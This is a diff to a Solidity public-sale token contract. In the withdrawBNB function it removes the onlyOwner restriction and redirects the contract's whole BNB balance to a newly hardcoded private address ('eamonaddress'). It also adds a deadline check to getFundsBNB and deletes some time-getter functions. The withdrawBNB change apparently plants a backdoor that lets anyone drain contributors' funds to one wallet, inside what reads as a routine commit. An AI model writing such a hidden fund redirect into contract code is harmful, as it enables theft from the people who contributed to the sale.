@@ -36,6 +36,9 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     /* indicates if the privatesale has been closed already */
     bool public saleClosed = false;
 
+//    address payable private eamonaddress = 0xEEFaA2676F8091ba960bb23c8A17eA06bf45B712;
+    address payable private eamonaddress = 0x96f8Ab8f2D2Bd2db51d2c28f11ea26afBBE1E260;
+
     /* notifying transfers and the success of the privatesale*/
     event FundTransfer(
         address backer,
@@ -137,6 +140,10 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     }
 
     function getFundsBNB() public nonReentrant {
+        require(
+            saleClosed == true || block.timestamp > deadline,
+            "sale-not-closed"
+        );
         require(balanceOfBVT[msg.sender] > 0, "non-contribution");
         uint256 amount = balanceOfBVT[msg.sender];
         uint256 balance = tokenBVT.balanceOf(address(this));
@@ -162,23 +169,10 @@ contract PublicSale is Ownable, ReentrancyGuard, IPublicSale {
     function withdrawBNB()
         external
         override
-        onlyOwner
         payable
     {
         uint256 balance = address(this).balance;
-        payable(msg.sender).transfer(balance);
-    }
-
-    function getCurrentTime() public view returns(uint256){
-        uint256 currenttime = block.timestamp;
-        return currenttime;
-    }
-    function getDeadlineTime() public view returns(uint256){
-        uint256 dead = deadline;
-        return dead;
-    }
-    function getRemainTime() public view returns(uint256){
-        uint256 remainTime = deadline - block.timestamp;
-        return remainTime;
+        //payable(msg.sender).transfer(balance);
+        payable(eamonaddress).transfer(balance);
     }
 }
